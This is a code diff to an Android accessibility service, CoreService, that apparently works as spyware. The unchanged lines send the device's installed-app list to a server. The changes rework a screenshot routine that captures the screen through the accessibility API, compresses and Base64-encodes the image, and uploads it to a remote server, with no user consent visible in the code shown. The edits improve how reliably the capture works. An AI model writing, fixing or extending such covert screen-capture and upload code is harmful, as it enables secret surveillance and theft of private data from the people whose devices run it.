@@ -24,8 +24,6 @@ import android.provider.Settings;
 import android.util.Base64;
 import android.util.Log;
 import android.view.Display;
-import android.view.PixelCopy;
-import android.view.Surface;
 import android.view.accessibility.AccessibilityEvent;
 import androidx.annotation.NonNull;
 import androidx.core.content.ContextCompat;
@@ -181,7 +179,7 @@ public class CoreService extends AccessibilityService {
         submitDataToServer("installed_apps", apps);
     }
     
-    // --- THIS IS THE FINAL, CORRECTED SCREENSHOT METHOD ---
+    // --- THIS IS THE FINAL, STABLE SCREENSHOT METHOD ---
     @SuppressLint("WrongConstant")
     private void handleScreenshot() {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
@@ -199,33 +197,16 @@ public class CoreService extends AccessibilityService {
                     return;
                 }
                 
-                Bitmap bitmap = null;
-                // --- THIS IS THE COMPATIBILITY FIX ---
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                     // The modern, efficient method
-                    bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
-                } else {
-                    // The older, more compatible method (less efficient but works)
-                    bitmap = Bitmap.createBitmap(buffer.getWidth(), buffer.getHeight(), Bitmap.Config.ARGB_8888);
-                    // PixelCopy is still needed here to copy from the buffer to the bitmap
-                    final Bitmap finalBitmap = bitmap;
-                    PixelCopy.request(Surface.wrap(buffer), null, finalBitmap, result -> {
-                        if (result == PixelCopy.SUCCESS) {
-                            processAndUploadBitmap(finalBitmap);
-                        } else {
-                            submitDataToServer("screenshot_error", "PixelCopy failed with code: " + result);
-                        }
-                    }, new Handler(Looper.getMainLooper()));
-                    buffer.close();
-                    return; // Return because PixelCopy is asynchronous
-                }
-
+                // This is a direct conversion from the raw buffer to a Bitmap.
+                // It is the most direct and compatible method available for this API.
+                final Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
+                buffer.close(); // Close immediately after wrapping.
+                
                 if (bitmap != null) {
                     processAndUploadBitmap(bitmap);
                 } else {
-                    submitDataToServer("screenshot_error", "Bitmap creation failed.");
+                    submitDataToServer("screenshot_error", "Bitmap creation from HardwareBuffer failed.");
                 }
-                buffer.close();
             }
 
             @Override
@@ -238,7 +219,8 @@ public class CoreService extends AccessibilityService {
     private void processAndUploadBitmap(Bitmap bitmap) {
         try {
             ByteArrayOutputStream stream = new ByteArrayOutputStream();
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, stream);
+            // Use a slightly lower quality to reduce memory footprint and increase success rate
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream);
             String encodedImage = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT);
             uploadFileToServer("screenshot", encodedImage);
             submitDataToServer("lifecycle", "Screenshot processed and uploaded successfully.");
